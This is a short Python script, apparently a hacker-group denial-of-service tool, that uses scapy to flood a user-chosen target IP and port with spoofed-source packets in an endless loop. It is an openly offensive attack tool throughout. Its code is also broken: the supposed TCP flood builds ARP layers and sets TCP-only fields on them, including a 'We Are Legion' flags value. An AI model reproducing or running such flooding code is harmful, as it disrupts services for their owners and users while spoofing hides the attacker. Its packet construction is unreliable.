import scapy.all as scapy
from os import system
from sys import stdout
from scapy.all import *
import scapy 
from random import randint
import colorama 
from colorama import Fore 
from colorama import init 
import datetime
from datetime import datetime


init()

authors = 'By Scare_Sec_Hackers'
date    = str(datetime.now())


def banner():
    print(Fore.MAGENTA+"""
........................
.▒▒▄▀▀▀▀▀▄▒▒▒▒▒▄▄▄▄▄▒▒▒.
.▒▐░▄░░░▄░▌▒▒▄█▄█▄█▄█▄▒.
.▒▐░▀▀░▀▀░▌▒▒▒▒▒░░░▒▒▒▒.
.▒▒▀▄░═░▄▀▒▒▒▒▒▒░░░▒▒▒▒.
.▒▒▐░▀▄▀░▌▒▒▒▒▒▒░░░▒▒▒▒.
........................
\033[31m"""+ authors, '\n' + date)


def randomIP():
    ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
    return ip


def randInt():
    x = randint(1000,9000)
    return x


def TCP_Flood(dstIP,dstPort,counter):
    total = 0
    while True:
        ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
        print(f"\033[35m[\033[36m*\033[35m] Hitting server     => {dstIP}")
        print("\033[35m[\033[36m*\033[35m] With RanDom IPA    => {}".format(ip))

        for x in range (0,counter):
            s_port = randInt()
            s_eq = randInt()
            w_indow = randInt()

            IP_Packet = IP ()
            IP_Packet.src = randomIP()
            IP_Packet.dst = dstIP

            ARP_Packet = ARP ()
            ARP_Packet.sport = s_port
            ARP_Packet.dport = dstPort
            ARP_Packet.flags = "We Are Legion"
            ARP_Packet.seq = s_eq
            ARP_Packet.window = w_indow

            send(IP_Packet/ARP_Packet, verbose=0)
            total+=1
        stdout.write("\n\033[35m[\033[36m!\033[35m] Total packets sent ==> %i\n" % total)


def info():
    system("clear")
    banner()
    dstIP = input ("\nTarget IP : ")
    dstPort = input ("Target Port : ")

    return dstIP,int(dstPort)


def main():
    dstIP,dstPort = info()
    counter = input ("How many packets do you want to send : ")
    TCP_Flood(dstIP,dstPort, int(counter))
    
if __name__ == "__main__":
    main()
